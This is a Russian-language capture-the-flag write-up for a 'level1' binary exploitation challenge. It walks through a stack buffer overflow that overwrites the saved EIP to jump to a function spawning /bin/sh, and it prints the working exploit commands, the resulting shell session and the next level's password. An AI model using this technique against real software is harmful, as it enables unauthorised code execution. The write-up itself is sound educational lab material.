## level1
Мы видим две функции: `main`, а также неиспользуемую функцию `run`, которая как раз и запускает оболочку `/bin/sh`. Наша цель – заставить `main` перейти к `run` перед завершением программы.

Рассмотрим её содержимое (с помощью [бинарного анализатора](https://cloud.binary.ninja/)):

![](docs/img/level1_1.png)

Программа использует буфер размера `0x40`, куда записывается строка из `STDIN`. Нам нужно совершить атаку [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) для того, чтобы перезаписать сохраненное на стеке значение `eip`  на адрес функции `run` , равный `0x08048444`. 

Чтобы найти отступ между началом буфера и сохраненным `eip` регистром, воспользуемся инструментом [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/). 

```sh
$ gdb level1
(gdb) r <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

(gdb) p $eip
$1 = (void (*)()) 0x63413563
```

Введя значение `0x63413563` в pattern generator, мы находим, что отступ равен 76. Значит, необходимая нам строка ввода есть  `'a'*76 + '\x44\x84\x04\x08'`, где мы записываем адрес `run` в обратном порядке ввиду того, что архитектура x86 использует [порядок байтов](https://ru.wikipedia.org/wiki/Порядок_байтов) от младшего к старшему. 

Однако это еще не все:

```sh
$ python -c "print 'a'*76 + '\x44\x84\x04\x08'" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Программа `/bin/sh`  выходит сразу же после прочтения EOF в потоке `stdin`. Чтобы предотвратить закрытие стандартного ввода, будем передавать команды через “прокладку” `cat`:

```sh
$ (python -c "print 'a'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
whoami
level2
cd ..; cat level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```